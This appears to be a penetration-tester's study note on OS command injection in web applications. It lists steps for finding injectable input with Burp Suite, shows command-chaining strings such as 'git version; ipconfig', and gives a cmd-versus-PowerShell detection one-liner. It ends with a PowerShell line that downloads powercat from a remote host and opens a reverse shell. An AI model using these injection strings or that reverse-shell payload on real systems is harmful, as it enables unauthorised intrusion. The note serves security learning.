
Web applications may need to interface and leverage OS functions/commands to support functions like file uploads etc. Generally there should be a special interface/API to handle this but it can be time consuming. So some user input may make it through to the operating system to be executed which can be used to change the way the Web Application behaves.

1. Identify user input that may make use of a command to process on the remote target
2. intercept the request with burpsuite to inspect anything of interest
3. if user input is found that may be used as part of a command we can play with the input the see if we can execute unintended commands
	1. chain commands with - e.g. `git version; ipconfig`, `git version && ipconfig`, `git version & ipconfig`
4. utilize successful execution to gain a shell on the target


determine if command line is PowerShell or cmd:

````
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
````

download files from remote server with PowerShell:

````
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
````

